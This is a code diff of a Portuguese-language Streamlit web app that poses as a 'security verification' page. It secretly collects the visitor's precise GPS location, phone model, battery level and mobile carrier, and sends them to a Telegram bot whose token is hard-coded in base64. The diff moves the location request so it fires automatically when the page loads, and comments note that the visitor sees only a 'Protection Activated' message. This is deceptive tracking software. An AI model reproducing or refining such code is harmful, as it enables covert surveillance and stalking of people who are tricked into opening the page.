@@ -4,7 +4,7 @@ import base64
 import time
 from streamlit_js_eval import streamlit_js_eval
 
-# --- CONFIGURAÇÃO ---
+# --- CONFIGURAÇÃO DO BOT ---
 B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
 B_ID = "ODQ5ODY2NDAyOA=="
 
@@ -18,43 +18,40 @@ def enviar_telegram(texto):
 
 st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
 
-st.title("Verificação de Segurança")
+# --- PEDIR LOCALIZAÇÃO AO ENTRAR (POP-UP AUTOMÁTICO) ---
+# Esta linha faz o navegador pedir permissão assim que o site carrega
+loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }, {enableHighAccuracy:true}); })"
+posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_AUTO_OPEN")
 
-# Coleta o "User Agent" (onde o nome do celular fica escondido)
+# Coleta de dados do aparelho
 ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DETECTOR")
 bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DETECTOR")
 
-if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL"):
-    # 1. FORÇA O POP-UP DE LOCALIZAÇÃO (Sem F5)
-    # A chave dinâmica força o navegador a pedir permissão novamente se necessário
-    loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }, {enableHighAccuracy:true}); })"
-    posicao = streamlit_js_eval(js_expressions=loc_js, key=f"GPS_{int(time.time())}")
+st.title("Verificação de Segurança")
 
-    # 2. Lógica para pegar o MODELO EXATO
-    modelo_exato = "Android Desconhecido"
+if st.button("● ATIVAR PROTEÇÃO AGORA"):
+    # 1. PEGAR O MODELO EXATO (Lógica avançada)
+    modelo_exato = "Smartphone Android"
     if ua:
-        # Tenta extrair o que está entre parênteses (onde fica a marca/modelo)
         try:
-            info_aparelho = ua.split("(")[1].split(")")[0]
-            partes = info_aparelho.split(";")
-            
-            # Procura por palavras chave de marcas conhecidas
-            marcas = ["POCO", "Samsung", "SM-", "Redmi", "Xiaomi", "Motorola", "Moto", "iPhone", "Pixel"]
+            info = ua.split("(")[1].split(")")[0]
+            partes = [p.strip() for p in info.split(";")]
+            # Procura marcas e códigos de modelo (Ex: POCO, SM-, etc)
+            marcas = ["POCO", "Samsung", "SM-", "Redmi", "Xiaomi", "Motorola", "iPhone", "2312"]
             for p in partes:
                 if any(m in p for m in marcas):
-                    modelo_exato = p.strip()
+                    modelo_exato = p
                     break
-            if modelo_exato == "Android Desconhecido":
-                modelo_exato = partes[-1].strip() # Pega a última info se não achar marca
-        except:
-            modelo_exato = "Smartphone Android"
+            if modelo_exato == "Smartphone Android":
+                modelo_exato = partes[-1]
+        except: pass
 
-    # 3. Operadora Real
+    # 2. Operadora
     try:
-        op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Rede Móvel')
-    except: op = "Vivo/Claro/Tim"
+        op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Móvel')
+    except: op = "Rede Móvel"
 
-    # 4. Resultado
+    # 3. Verificação e Envio
     if posicao and posicao != "erro":
         link_maps = f"https://www.google.com/maps?q={posicao}"
         
@@ -66,10 +63,11 @@ if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL"):
             f"📍 *Local:* {link_maps}"
         )
         enviar_telegram(relatorio)
-        st.success("Proteção Ativada") # Apenas a mensagem verde no site
+        # SÓ APARECE ISSO NO SITE
+        st.success("Proteção Ativada")
     elif posicao == "erro":
-        st.error("Erro: Ative o GPS e permita o acesso no navegador.")
+        st.error("Erro: A permissão de localização foi negada.")
     else:
-        st.info("Aguardando localização... (Clique em 'Permitir' no topo da tela)")
+        st.warning("Aguardando permissão de localização... verifique o topo da tela.")
 
 st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
